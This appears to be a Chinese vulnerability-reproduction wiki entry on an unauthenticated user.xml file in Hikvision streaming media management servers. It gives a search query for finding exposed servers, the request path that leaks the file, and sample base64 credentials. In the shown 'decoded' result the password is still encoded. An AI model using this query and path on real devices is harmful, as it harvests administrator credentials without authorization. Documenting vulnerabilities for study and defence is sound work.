---
title: "Hikvision 流媒体管理服务器 user.xml 账号密码泄漏漏洞"
date: 2026-10-18 09:14:39
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "漏洞复现"
---
## 漏洞描述

Hikvision 流媒体管理服务器配置文件未做鉴权，攻击者通过漏洞可以获取网站账号密码

## 漏洞影响

```
Hikvision 流媒体管理服务器
```

## 网络测绘

```
"杭州海康威视系统技术有限公司 版权所有" && title="流媒体管理服务器"
```

## 漏洞复现

登陆页面

![image-20220519172629739](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191726829.png)

POC

```
/config/user.xml
```

![image-20220519172714407](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191727443.png)

```
<user name="YWRtaW4=" password="MTIzNDU="/>
```

base64解密

```
<user name="admin" password="MTIzNDU="/>
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
